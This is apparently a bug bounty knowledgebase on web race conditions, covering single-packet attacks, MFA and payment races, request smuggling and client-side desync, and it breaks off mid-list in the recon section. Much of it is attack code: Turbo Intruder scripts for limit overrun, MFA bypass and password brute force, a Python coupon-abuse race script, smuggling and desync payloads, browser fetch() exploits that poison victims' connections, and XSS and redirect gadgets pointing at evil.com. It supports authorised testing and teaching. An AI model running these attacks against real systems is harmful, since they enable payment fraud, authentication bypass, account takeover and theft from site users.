# Race Conditions - Advanced Bug Bounty & Black-Box Testing Knowledgebase

> **Version**: Research Grade v1.0  
> **Scope**: Web Race Conditions, TOCTOU, Single-Packet Attacks, Request Smuggling Chains, Cache Poisoning, OAuth/MFA Race Conditions, Payment/Cart Abuse, Automation & Recon  
> **Sources**: PortSwigger Research, HackTricks, PayloadsAllTheThings, Nuclei Templates, Turbo Intruder, HTTP Request Smuggler, Defparam/Smuggler, Real-World Bug Bounty Cases

---

## Table of Contents

- [Basics](#basics)
- [Race Condition Theory](#race-condition-theory)
- [TOCTOU Internals](#toctou-internals)
- [Parallel Request Abuse](#parallel-request-abuse)
- [Single-Packet Attacks](#single-packet-attacks)
- [Limit Overrun Attacks](#limit-overrun-attacks)
- [MFA Race Conditions](#mfa-race-conditions)
- [Coupon/Cart Race Conditions](#couponcart-race-conditions)
- [Payment Race Conditions](#payment-race-conditions)
- [Request Queue Desynchronization](#request-queue-desynchronization)
- [Browser-Powered Race Conditions](#browser-powered-race-conditions)
- [Cache Poisoning + Race Condition Chains](#cache-poisoning--race-condition-chains)
- [OAuth + Race Condition Chains](#oauth--race-condition-chains)
- [Request Smuggling + Race Condition Chains](#request-smuggling--race-condition-chains)
- [Parser Confusion Payloads](#parser-confusion-payloads)
- [Browser Quirks](#browser-quirks)
- [Gadget Chains](#gadget-chains)
- [Real World Case Studies](#real-world-case-studies)
- [Fuzzing Payloads](#fuzzing-payloads)
- [Automation Workflows](#automation-workflows)
- [Recon Methodology](#recon-methodology)
- [Nuclei Templates](#nuclei-templates)
- [Tools and Scanners](#tools-and-scanners)
- [Advanced Research](#advanced-research)
- [Bug Bounty Writeups](#bug-bounty-writeups)
- [Payload Collections](#payload-collections)
- [WAF Bypasses](#waf-bypasses)
- [Detection Techniques](#detection-techniques)
- [References](#references)

---

## Basics

### What is a Race Condition?

A race condition occurs when a website processes requests concurrently without adequate safeguards, causing multiple distinct threads to interact with the same data simultaneously. This "collision" results in unintended behavior that attackers can exploit for malicious purposes.

**Key Characteristics:**
- Requires concurrent/multi-threaded request processing
- Involves shared mutable state (database records, session variables, files)
- The "race window" is the fraction of time between check and update operations
- Impact varies based on application functionality

### The Race Window

```
[Request 1] ----> [Check State] ----> [Process] ----> [Update State]
                                    ^
                                    | Race Window
[Request 2] ----> [Check State] ----> [Process] ----> [Update State]
```

The race window is the period during which a collision is possible — often just milliseconds.

### Core Concepts

| Term | Definition |
|------|------------|
| **TOCTOU** | Time-of-Check to Time-of-Use |
| **Sub-state** | Temporary hidden state during request processing |
| **Single-Packet Attack** | HTTP/2 technique sending 20-30 requests in one TCP packet |
| **Last-Byte Sync** | HTTP/1.1 technique withholding final byte to synchronize requests |
| **Connection Warming** | Sending dummy requests to stabilize backend connection timing |
| **Jitter** | Unpredictable network delays affecting request synchronization |

---

## Race Condition Theory

### The "Everything is Multi-step" Principle

> "Every pentester knows that multi-step sequences are a hotbed for vulnerabilities, but with race conditions, everything is multi-step." — James Kettle, PortSwigger Research

Traditional assumptions that fail:
1. "GET requests don't change state" — they often do (session initialization, logging)
2. "Requests are atomic" — they transition through multiple hidden sub-states
3. "Database transactions prevent races" — ORMs and frameworks often hide the dangers

### State Machine Abuse

Applications transition through hidden states during single-request processing:

```
[null] --POST /login--> [admin] --GET /role--> [pending] --POST /role--> [staff]
                          ^
                          | Race Window: User has admin session before role overwrite
```

**Key Insight**: A single HTTP request may transition an application through multiple fleeting, hidden states (sub-states). If timed correctly, these sub-states can be abused for unintended transitions.

### Concurrency Models

| Architecture | Race Condition Risk |
|------------|-------------------|
| Multi-threaded + shared DB | **High** — classic race condition target |
| Single-threaded (Node.js) | **Medium** — still vulnerable to async races |
| Microservices | **High** — distributed state increases complexity |
| Serverless/Lambda | **Medium-High** — cold starts and execution delays create windows |

---

## TOCTOU Internals

### Time-of-Check to Time-of-Use Explained

TOCTOU is the fundamental pattern behind most race conditions:

```python
# Vulnerable pseudo-code
def apply_discount(code):
    # TIME OF CHECK
    if code_already_used(user_id, code):
        return "Code already used"

    # RACE WINDOW BEGINS

    # TIME OF USE
    apply_discount_to_order(order_id, code)
    mark_code_used(user_id, code)

    # RACE WINDOW ENDS
```

**The Problem**: Between the check and the update, another thread can perform the same check and see the same "unused" state.

### TOCTOU Variations

| Type | Description | Example |
|------|-------------|---------|
| **Check-Check-Use** | Double check before use | Password reset token validation |
| **Use-Check** | Action before validation | Payment processed before balance check |
| **Check-Use-Check** | Validation sandwich | File upload: check size → upload → check again |
| **Deferred Check** | Background validation | Email sent before database commit |

### Detecting TOCTOU in Code

Look for these patterns:
- `if not exists: then create`
- `if has_permission: then execute`
- `if balance >= amount: then withdraw`
- `if not used: then mark_used`

**Red Flags:**
- Separate SELECT and UPDATE statements
- Session variables updated individually (not batched)
- No database-level locking or transactions
- ORM "save" operations without explicit transactions

---

## Parallel Request Abuse

### HTTP/1.1 Last-Byte Synchronization

**Technique**: Send all request data except the final byte, then release all final bytes simultaneously.

```python
# Turbo Intruder - Last-Byte Sync
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False)

    for i in range(30):
        engine.queue(target.req, i)
        engine.queue(target.req, target.baseInput, gate='race1')

    engine.start(timeout=5)
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

**Limitations:**
- Network jitter affects synchronization (3ms+ spread typical)
- Less effective over high-latency connections
- Requires multiple parallel connections

### HTTP/2 Single-Packet Attack

**Technique**: Use HTTP/2 multiplexing to send 20-30 requests completed by a single TCP packet, eliminating network jitter.

```python
# Turbo Intruder - Single-Packet Attack Template
def queueRequests(target, wordlists):
    # HTTP/2 single-packet attack configuration
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Queue 20 requests in gate '1'
    for i in range(20):
        engine.queue(target.req, gate='1')

    # Send all requests in gate '1' simultaneously
    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

**Benchmarks (Melbourne to Dublin, 20 requests):**

| Technique | Median Spread | Standard Deviation |
|-----------|--------------|-------------------|
| Last-byte sync | 4ms | 3ms |
| Single-packet attack | 1ms | 0.3ms |

**Implementation Details:**
1. Pre-send bulk of each request (withhold END_STREAM flag or final byte)
2. Wait 100ms for initial frames to arrive
3. Disable TCP_NODELAY (enable Nagle's algorithm)
4. Send ping packet to warm connection
5. Send withheld frames — OS batches them into single TCP packet

### Connection Warming

When backend connection delays interfere with timing:

```python
# Turbo Intruder - Connection Warming + Attack
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Warm the connection
    for i in range(5):
        engine.queue(target.req, gate='warmup')
    engine.openGate('warmup')

    # Main attack
    for i in range(20):
        engine.queue(target.req, gate='attack')
    engine.openGate('attack')
```

### Abusing Rate/Resource Limits

When endpoints have different processing speeds, trigger rate limits to intentionally delay faster endpoints:

```
[Slow Endpoint] ----> [Race Window]
[Fast Endpoint] ----> [delay] ----> [delay] ----> [Race Window]
                        ^
                        +-- Rate limit triggered by 10+ dummy requests
```

---

## Single-Packet Attacks

### Protocol Analysis

| Protocol | Multiplexing | Max Packet Size | Single-Packet Viable | Notes |
|----------|-------------|-----------------|---------------------|-------|
| HTTP/2 over TCP | Yes | 65,535 bytes | **Yes** — primary technique | 20-30 requests reliably |
| HTTP/3 over QUIC | Yes | ~1,500 bytes | Possible but not worth effort | UDP datagram limit |
| HTTP/1.1 | No (sequential) | N/A | No — use last-byte sync | Head-of-line blocking |
| WebSocket | No (per RFC) | N/A | Partial — RFC 8441 nesting | Limited fragmentation |
| SMTP | No | N/A | No | Sequential processing |

### Rolling Your Own Implementation

**Algorithm (fits on one page):**

```
1. Pre-send request bulk:
   - No body: Send all headers, don't set END_STREAM
     → Withhold empty data frame with END_STREAM
   - Has body: Send headers + all body except final byte
     → Withhold data frame containing final byte

2. Prepare final frames:
   - Wait 100ms for initial frames to transmit
   - Disable TCP_NODELAY (crucial for Nagle's algorithm)
   - Send ping packet to warm local connection

3. Send withheld frames:
   - OS network stack batches them into single TCP packet
   - Verify with Wireshark
```

**Reference Implementation**: Turbo Intruder's `SpikeEngine.kt` and `SpikeConnection.kt`

### Adapting to Target Architecture

**Front-end/Back-end Considerations:**
- Front-end may forward some requests over existing connections, create fresh connections for others
- Front-end routing often done per-connection basis
- Connection warming can smooth request timing
- Distinguish connection delays from application locking

**Session-Based Locking:**
- PHP native session handler: processes one request per session at a time
- If all requests process sequentially, try different session tokens per request
- Frameworks may implement request locking — identify and bypass

---

## Limit Overrun Attacks

### Classic Limit Overrun Scenarios

| Target | Attack | Impact |
|--------|--------|--------|
| Gift cards | Redeem same code multiple times | Financial gain |
| Promo codes | Apply discount repeatedly | Price reduction to zero |
| Product ratings | Rate multiple times | Reputation manipulation |
| Cash withdrawal | Withdraw beyond balance | Overdraft/loss |
| CAPTCHA | Reuse single solution | Bot bypass |
| Login rate limit | Brute-force during window | Account takeover |
| API rate limits | Exceed quota | Resource abuse |
| Group/project limits | Create beyond limit | Feature abuse |

### Generic Exploitation Pattern

```
1. Identify single-use or rate-limited endpoint
2. Benchmark normal behavior (sequential requests)
3. Send parallel requests using single-packet or last-byte sync
4. Observe if limit is exceeded
5. Prove concept: achieve meaningful impact
```

### Burp Repeater Workflow

```
1. Send request to Repeater
2. Add to group (right-click > Add to new group)
3. Duplicate tab 20-40 times (Ctrl+R or right-click > Duplicate)
4. Send group in parallel (single-packet attack for HTTP/2)
5. Compare responses to sequential baseline
```

### Turbo Intruder - Rate Limit Bypass

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    passwords = wordlists.clipboard

    for password in passwords:
        engine.queue(target.req, password, gate='1')

    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

**Key Parameters:**
- `engine=Engine.BURP2` — HTTP/2 single-packet attack
- `concurrentConnections=1` — Required for single-packet
- `gate='1'` — Groups requests for simultaneous release

---

## MFA Race Conditions

### MFA Bypass via Hidden Multi-step Sequences

**Classic Flaw**: Login with known credentials → navigate directly to app (forced browsing) → bypass MFA

**Race Condition Variation**: The MFA enforcement happens in a sub-state within a single request:

```python
# Vulnerable pseudo-code
def login():
    session['userid'] = user.userid        # Sub-state: logged in, no MFA yet
    if user.mfa_enabled:
        session['enforce_mfa'] = True      # MFA enforcement
        generate_and_send_mfa_code(user)
        redirect_to_mfa_form()
    else:
        redirect_to_app()
```

**Race Window**: Between `session['userid']` assignment and `session['enforce_mfa']` assignment.

**Exploitation:**
```
[Request 1] POST /login (valid credentials)
    → Creates session with userid but before MFA enforcement

[Request 2] GET /admin (same session cookie)
    → Accesses authenticated endpoint during race window
```

### Multi-Endpoint MFA Race

```python
# Turbo Intruder - MFA bypass
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Request 1: Login
    login_req = '''POST /login HTTP/2
Host: target.com
Cookie: session=ATTACKER_SESSION

username=victim&password=known'''

    # Request 2: Access protected resource
    access_req = '''GET /admin HTTP/2
Host: target.com
Cookie: session=ATTACKER_SESSION'''

    engine.queue(login_req, gate='mfa')
    engine.queue(access_req, gate='mfa')
    engine.openGate('mfa')

def handleResponse(req, interesting):
    table.add(req)
```

### Real-World Impact

- Complete MFA bypass on authentication frameworks (Devise/Rails)
- Session fixation during login process
- Privilege escalation during role assignment

---

## Coupon/Cart Race Conditions

### Multiple Coupon Application

**Vulnerability**: Apply same coupon code multiple times simultaneously to stack discounts.

**Attack Flow:**
```
1. Add item to cart ($100)
2. Apply coupon "50OFF" (cart = $50)
3. Race condition: Apply "50OFF" 5 times simultaneously
4. Result: $100 - (5 × $50) = -$150 (negative balance or free item)
```

**Burp Repeater Setup:**
```http
POST /cart/coupon HTTP/2
Host: vulnerable-shop.com
Cookie: session=ABC123

promo_code=50OFF
```

- Duplicate 20-40 times
- Send in parallel
- Check if multiple "success" responses received

### Cart Manipulation During Payment

**Classic Exploit**: Add item → pay → add more items → force-browse to confirmation

**Race Variation**: Payment validation and order confirmation in single request:

```
[basket pending] --POST /makePayment--> [payment validated] --[race window]--> [basket confirmed]
                                                          ^
                                                          +-- Add items during window
```

**Exploitation:**
```
[Request 1] POST /makePayment (valid payment for $10 item)
    → Payment validated, basket confirmed pending

[Request 2] POST /cart/add (add $1000 item during race window)
    → Item added to basket before final confirmation

Result: $1000 item purchased for $10
```

### Inventory/Stock Race Conditions

**Scenario**: Limited stock item (1 remaining)

```
[Request 1] POST /buy (item_id=123)
    → Check stock: 1 available
    → [RACE WINDOW]

[Request 2] POST /buy (item_id=123)
    → Check stock: 1 available (same time)
    → [RACE WINDOW]

Both requests see stock=1, both process payment, both decrement to -1
```

---

## Payment Race Conditions

### Payment Gateway Race Conditions

**Attack Vectors:**
1. **Double-spend**: Send multiple payment requests simultaneously
2. **Refund race**: Request refund while transaction still processing
3. **Currency/price race**: Change currency during payment processing
4. **Status confusion**: Confirm payment before bank verification completes

### Payment State Machine Abuse

```
[initiated] --POST /pay--> [processing] --[race window]--> [confirmed]
                                    ^
                                    +-- Cancel/revert during window
                                    +-- Modify amount during window
```

### Exploitation Example

```python
# Turbo Intruder - Payment race
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Request 1: Initiate payment
    pay_req = '''POST /api/payment HTTP/2
Host: target.com
Authorization: Bearer TOKEN

{"amount": 1.00, "currency": "USD"}'''

    # Request 2: Modify amount (if separate endpoint exists)
    modify_req = '''POST /api/cart/update HTTP/2
Host: target.com
Authorization: Bearer TOKEN

{"item_id": 123, "price": 0.01}'''

    engine.queue(pay_req, gate='pay')
    engine.queue(modify_req, gate='pay')
    engine.openGate('pay')
```

### Real-World Cases

- **Tesla (2020)**: Purchased vehicle software upgrades for free via race condition
- **Uber (2016)**: Infinite promo credits via concurrent redemption
- **E-commerce**: Multiple coupon stacking reducing price to zero

---

## Request Queue Desynchronization

### Queue-Based Race Conditions

When requests are queued for asynchronous processing:

```
[Request 1] POST /email-change (queued)
[Request 2] POST /confirm-email (queued)

Queue processing order may differ from submission order:
    - Request 2 processed first → confirms old email
    - Request 1 processed second → changes to new email
    - Result: New email confirmed without verification
```

### Message Queue Abuse

**Scenario**: Background job processing

```python
# Vulnerable: Email change queued for background processing
def change_email():
    queue_background_job('send_confirmation', new_email)
    update_database('unconfirmed_email', new_email)
    # Race: confirmation sent before unconfirmed_email is set
```

### Deferred Collisions

Some race conditions don't require immediate collision — the application batches processing:

```
[Request 1] POST /change-email (time T)
[Request 2] POST /change-email (time T+20 minutes)

Both processed in same batch → unpredictable final state
```

**Detection**: Look for second-order clues (inconsistent emails, changed behavior after delay)

---

## Browser-Powered Race Conditions

### Client-Side Desync (CSD) Attacks

**Concept**: Turn the victim's browser into a desync delivery platform.

**Attack Flow:**
```
1. Victim visits attacker.com
2. attacker.com makes victim's browser send:
   - Request A: Crafted to desync browser's connection
   - Request B: Harmful request that gets prefixed to victim's request
3. Browser connection pool poisoned
4. Subsequent requests from victim include attacker's payload
```

### Browser Connection Pool Poisoning

```javascript
// CSD Exploit - Poison connection and hijack JS resource
fetch('https://victim.com/assets', {
    method: 'POST',
    body: "GET /robots.txt HTTP/1.1\r\nX: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://victim.com/'
})
```

**Key Requirements:**
- Target must support HTTP/1.1 (browsers prefer HTTP/2)
- Target must ignore Content-Length on specific endpoint
- Attacker site must be HTTPS + different domain

### Stacked Response Problem

Browsers discard connections if they receive more response data than expected. Solutions:
- Use cache-busters to delay responses (cache miss = longer processing)
- Use `mode: 'cors'` to trigger CORS error (prevents redirect following)
- Pad injected requests with lengthy headers

### Advanced CSD Gadgets

**HEAD Method Splicing:**
```
POST /assets HTTP/1.1
Host: victim.com
Content-Length: 67

HEAD /404/?cb=123 HTTP/1.1
GET /x?<script>evil()</script> HTTP/1.1
X: Y
```

**Cache Poisoning via CSD:**
```javascript
// Poison cache entry for JS file
fetch('https://victim.com/robots.txt', {
    method: 'POST',
    body: 'GET /+webvpn+/ HTTP/1.1
Host: x.psres.net
X: Y',
    credentials: 'include'
}).catch(() => {
    location = 'https://victim.com/+CSCOE+/win.js'
})
```

---

## Cache Poisoning + Race Condition Chains

### Cache Key Entanglement

When cache normalization creates collisions between different requests:

```
GET /?x=%22/%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: example.com
    → Cache key: https|GET|example.com|/

GET / HTTP/1.1
Host: example.com
    → Cache key: https|GET|example.com|/

Result: Second request gets poisoned XSS response
```

### Race Condition to Cache Poisoning

**Chain:**
```
1. Race condition creates inconsistent state
2. Inconsistent state reflected in cacheable response
3. Cache saves poisoned response
4. All subsequent users receive poisoned response
```

**Example:**
```
[Request 1] POST /change-email (to attacker@evil.com)
[Request 2] POST /confirm-email (legitimate confirmation)

Race result: Email confirmed as attacker@evil.com
    → Profile page reflects this (cacheable)
    → Cache poisoned with attacker's email
    → Other users see attacker's email on profile
```

### Fat GET Cache Poisoning

When cache excludes body from key but forwards body to backend:

```http
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

**Result**: Cache key is `GET|github.com|/contact/report-abuse?report=albinowax` but backend processes `report=innocent-victim`.

---

## OAuth + Race Condition Chains

### OAuth State Parameter Race

**Attack:**
```
[Request 1] GET /oauth/authorize?state=LEGIT&client_id=app
    → Server generates auth code bound to state=LEGIT

[Request 2] GET /oauth/authorize?state=ATTACKER&client_id=app
    → Overwrites state in session

[Request 3] GET /oauth/callback?code=CODE&state=ATTACKER
    → Code validated against ATTACKER state
    → Attacker gets access token
```

### OAuth Code Replay

```
[Request 1] POST /oauth/token (code=AUTH_CODE)
    → Code marked as used

[Request 2] POST /oauth/token (code=AUTH_CODE)
    → [RACE WINDOW] Code still valid
    → Second token issued
```

### Hidden OAuth Attack Vectors

**OAuth Linking Race:**
```
[Request 1] POST /link-oauth (provider=google, account=victim)
    → Initiates linking

[Request 2] POST /link-oauth (provider=google, account=attacker)
    → Overwrites linking state

Result: Attacker's Google account linked to victim's local account
```

---

## Request Smuggling + Race Condition Chains

### HTTP/1.1 Desync + Race

**CL.TE Desync:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X: y
```

**Race Condition Enhancement:**
```
[Request 1] Desync request (smuggled prefix)
[Request 2] Victim request (processed with prefix)

Race: If victim request arrives during smuggling window,
      prefix applied to victim's request
```

### HTTP/2 Downgrade Smuggling + Race

```http
POST / HTTP/2
Host: target.com
Content-Length: 23

GET /404 HTTP/1.1
X: X
```

**AWS ALB Vulnerability**: ALB added `Transfer-Encoding: chunked` when downgrading HTTP/2 without CL to HTTP/1.1.

### 0.CL Desync Attacks

**The Deadlock Problem:**
```http
GET /Logon HTTP/1.1
Host: target.com
Content-Length: 7

GET /404 HTTP/1.1
X: Y
```

Front-end doesn't see CL → buffers body → back-end sees CL → waits for body → deadlock.

**Breaking the Deadlock - Early Response Gadgets:**
- `/con`, `/nul`, `/aux` on Windows IIS (reserved names)
- Server-level redirects
- Static files on nginx (responds before body complete)

**Double-Desync Conversion:**
```http
POST /nul HTTP/1.1
Content-length: 163

POST / HTTP/1.1
Content-Length: 111
GET / HTTP/1.1
Host: target.com
GET /wrtz HTTP/1.1
Foo: bar
```

### Expect-Based Desync

**Vanilla Expect:**
```http
POST / HTTP/1.1
Host: target.com
Expect: 100-continue
Content-Length: 5

X
```

**Obfuscated Expect:**
```http
POST / HTTP/1.1
Host: target.com
Expect: 100-continue
Content-Length: 5

XGET / HTTP/1.1
Host: target.com
```

---

## Parser Confusion Payloads

### HTTP Header Obfuscation

**Transfer-Encoding Variations:**
```http
Transfer-Encoding : chunked
Transfer-Encoding:	chunked
Transfer-Encoding	:	chunked
Transfer-Encoding : chunked
 Transfer-Encoding: chunked
Transfer-Encoding: chunked 
X: XTransfer-Encoding: chunked
Transfer-Encoding: chunkedX: X
```

**Content-Length Variations:**
```http
Content-Length : 5
Content-Length:	5
Content-Length	:	5
 Content-Length: 5
Content-Length: 5 
```

### Host Header Confusion

```http
Host: target.com
X-Forwarded-Host: evil.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
Host: target.com:1337
Host: target.com@evil.com
Host: evil.com
X-Host: evil.com
```

### URL Parsing Discrepancies

```http
GET /%2e%2e/admin HTTP/1.1
GET /..;/admin HTTP/1.1
GET /admin/./ HTTP/1.1
GET /admin%20 HTTP/1.1
GET /admin%00 HTTP/1.1
GET /admin%0d%0a HTTP/1.1
```

---

## Browser Quirks

### Chrome Behaviors

- **Connection Pools**: Separate pools for credentialed vs non-credentialed requests
- **HTTP/2 Preference**: Uses HTTP/2 when available (bad for CSD attacks)
- **CORS Errors**: `mode: 'cors'` prevents redirect following (useful for CSD)
- **Cache Partitioning**: Top-level navigation required to bypass
- **Stacked Response Handling**: Discards connections with excess data

### Firefox Behaviors

- **Update Mechanism**: Periodic checks to `download.mozilla.org` (cache poisoning target)
- **HTTP/2 Support**: Similar to Chrome but different implementation details
- **Connection Reuse**: Different connection pooling strategy

### Safari Behaviors

- **WebKit Quirks**: Different handling of malformed responses
- **HSTS**: Strict transport security may affect attack vectors

### Cross-Browser Considerations

```javascript
// Universal CSD detection script
function testCSD(target) {
    return fetch(target, {
        method: 'POST',
        body: 'GET / HTTP/1.1
X: Y',
        mode: 'no-cors',
        credentials: 'include'
    }).then(r => r.status).catch(e => 'error');
}
```

---

## Gadget Chains

### Reflected XSS Gadgets

```http
GET /?x="><script>alert(1)</script> HTTP/1.1
Host: target.com
```

### JSONP Gadgets

```http
GET /jsonp?callback=alert(1)// HTTP/1.1
Host: target.com
```

### Open Redirect Gadgets

```http
GET /redirect?url=https://evil.com HTTP/1.1
Host: target.com
```

### CSS Injection Gadgets

```http
GET /style.css?x=a);@import url(https://evil.com/malicious.css) HTTP/1.1
Host: target.com
```

### Resource File Poisoning

```http
GET /api/config?callback=foo HTTP/1.1
Host: target.com

// Response:
foo({"api_key": "secret", "endpoint": "internal"})
```

---

## Real World Case Studies

### Case Study 1: GitLab Email Confirmation Race (CVE-2022-4037)

**Researcher**: James Kettle (PortSwigger)
**Impact**: Account takeover, OpenID hijacking
**Bounty**: Medium (personally classified as High)

**Vulnerability**: Changing email to two addresses simultaneously caused confirmation token to be sent to wrong address with valid token.

**Root Cause**: Devise (Rails auth framework) inconsistency:
- Email destination passed as argument to `send_devise_notification`
- Email body generated from database via template engine
- Race window between notification invocation and body generation

**Exploit:**
```http
POST /-/profile HTTP/2
Host: gitlab.com

user[email]=test1@psres.net
```
(Send two simultaneous requests with different emails)

**Result**: Email sent to test2@psres.net containing confirmation token for test1@psres.net

### Case Study 2: Facebook Email Confirmation (2016)

**Researcher**: Josip Franjković
**Impact**: Email confirmation bypass

**Vulnerability**: Changing Facebook email to two addresses simultaneously triggered email with two distinct confirmation codes.

**Result**: `/confirmemail.php?e=user@gmail.com&c=13475&code=84751`

### Case Study 3: Amazon H2.0 Desync

**Researcher**: James Kettle (PortSwigger)
**Impact**: Request smuggling, user credential theft

**Vulnerability**: Amazon ignored Content-Length on `/b/` endpoint when HTTP/2 downgraded.

**Exploit:**
```http
POST /b/ HTTP/2
Host: www.amazon.com
Content-Length: 23

GET /404 HTTP/1.1
X: X
```

**Result**: Victim requests stored in attacker's shopping list, including authentication tokens.

### Case Study 4: Cloudflare 24M Site Takeover

**Researchers**: Wannes Verwimp + James Kettle
**Impact**: 24,000,000 websites exposed to complete takeover
**Bounty**: $7,000

**Vulnerability**: H2.0 desync internal to Cloudflare infrastructure — Tier 1 to Tier 2 cache poisoning.

**Attack Flow:**
```
Attacker → Cloudflare Tier 1 → Cloudflare Tier 2 (cache) → Heroku → Origin
                    ↓
              Desync occurs between Tier 1 and Tier 2
                    ↓
              Attacker's prefix poisons cache for JS files
                    ↓
              All visitors to any site get attacker's JS
```

### Case Study 5: Tesla Free Software Upgrades

**Year**: 2020
**Impact**: Free vehicle software upgrades

**Attack**: Multiple simultaneous purchase requests for paid software upgrades.

### Case Study 6: Uber Infinite Promo Credits

**Year**: 2016
**Impact**: Infinite promotional credits

**Attack**: Race condition in promo code redemption system.

### Case Study 7: GitLab Invitation Hijacking

**Impact**: Admin access to other projects

**Attack**: Race condition in invitation system created multiple invitations — low-privilege invitation masked by admin-level invitation.

---

## Fuzzing Payloads

### Race Condition Trigger Payloads

```http
# Basic parallel request template
POST /api/action HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Authorization: Bearer {{token}}

{"action": "{{action}}", "target": "{{target}}"}
```

### Session Collision Probes

```http
# Test session variable collision
POST /api/reset-password HTTP/1.1
Host: {{Hostname}}
Cookie: session={{session}}

{"email": "user1@example.com"}
```

(Send parallel with different emails, same session)

### Database State Probes

```http
# Test for partial construction
POST /api/register HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"username": "test{{random}}", "email": "test@example.com", "api_key": ""}
```

### Array/Null Injection for Partial Construction

```http
# PHP array injection
GET /api/user/info?user=victim&api-key[]= HTTP/1.1
Host: {{Hostname}}

# Ruby on Rails nil injection
GET /api/user/info?user=victim&api-key[key] HTTP/1.1
Host: {{Hostname}}
```

### Time-Sensitive Token Probes

```http
# Test timestamp-based tokens
POST /api/reset-password HTTP/1.1
Host: {{Hostname}}

{"email": "victim@example.com"}
```

(Send two requests simultaneously, compare tokens)

---

## Automation Workflows

### Turbo Intruder Automation Templates

#### Template 1: Basic Race Condition

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    for i in range(20):
        engine.queue(target.req, gate='race')

    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

#### Template 2: Multi-Endpoint Race

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    req1 = '''POST /endpoint1 HTTP/2
Host: {{Hostname}}
Cookie: session={{session}}

param1=value1'''

    req2 = '''GET /endpoint2 HTTP/2
Host: {{Hostname}}
Cookie: session={{session}}'''

    engine.queue(req1, gate='multi')
    engine.queue(req2, gate='multi')
    engine.openGate('multi')

def handleResponse(req, interesting):
    table.add(req)
```

#### Template 3: Rate Limit Bypass with Wordlist

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    passwords = wordlists.clipboard

    for password in passwords:
        engine.queue(target.req, password, gate='brute')

    engine.openGate('brute')

def handleResponse(req, interesting):
    if req.status == 302:
        table.add(req)
```

#### Template 4: Email Extraction (No-Clue Token Misrouting)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    for i in range(50):
        engine.queue(target.req, gate='email')

    engine.openGate('email')

def handleResponse(req, interesting):
    table.add(req)
    # Check email inbox for tokens
    # Automate token extraction and verification
```

#### Template 5: Connection Warming + Attack

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Warmup
    for i in range(5):
        engine.queue(target.req, gate='warmup')
    engine.openGate('warmup')

    # Attack
    for i in range(20):
        engine.queue(target.req, gate='attack')
    engine.openGate('attack')

def handleResponse(req, interesting):
    table.add(req)
```

### Burp Suite Repeater Workflow

```
1. Intercept target request
2. Send to Repeater (Ctrl+R)
3. Right-click tab → Add to new group
4. Duplicate tab 20-40 times
5. Right-click group → Send group in parallel
6. Analyze response differences
```

### Python Automation Script

```python
import requests
import threading
import time

def race_request(url, headers, data, results, index):
    try:
        resp = requests.post(url, headers=headers, data=data, timeout=5)
        results[index] = resp.status_code
    except Exception as e:
        results[index] = str(e)

def exploit_race(url, headers, data, num_requests=20):
    results = [None] * num_requests
    threads = []

    for i in range(num_requests):
        t = threading.Thread(target=race_request, args=(url, headers, data, results, i))
        threads.append(t)

    # Synchronize start
    start_time = time.time() + 0.1
    for t in threads:
        t.start()

    for t in threads:
        t.join()

    return results

# Usage
url = "https://target.com/api/coupon"
headers = {"Cookie": "session=ABC123"}
data = {"promo_code": "50OFF"}

results = exploit_race(url, headers, data, 20)
print(f"Success count: {results.count(200)}")
```

---

## Recon Methodology

### Predict → Probe → Prove Methodology

#### Phase 1: Predict Potential Collisions

**Identify Security-Critical Objects:**
- Users, sessions, orders, payments
- Coupons, credits, inventory items
- API keys, tokens, permissions

**Three Key Questions:**

1. **How is state stored?**
   - Persistent server-side (database, cache) → **High potential**
   - Client-side (JWT, cookies) → Skip
   - Session-based → Medium potential

2. **Are we editing or appending?**
   - Editing existing data → **High collision potential**
   - Appending to data → Limit-overrun only

3. **What's the operation keyed on?**
   - Same key for both operations → **Collision possible**
   - Different keys → No collision

**Example Analysis:**
```
Password Reset Implementation A:
  - Key: userid
  - Session=b94, userid=hacker → Record: hacker/token1
  - Session=b94, userid=victim → Record: victim/token2
  → NO COLLISION (different records)

Password Reset Implementation B:
  - Key: sessionid
  - Session=b94, userid=hacker → Record: b94/hacker/token1
  - Session=b94, userid=victim → Record: b94/victim/token2
  → COLLISION POSSIBLE (same session record)
```

#### Phase 2: Probe for Clues

**Benchmarking:**
```
1. Send request blend with seconds between each (baseline)
2. Send same blend simultaneously (single-packet attack)
3. Compare for deviations:
   - Response differences
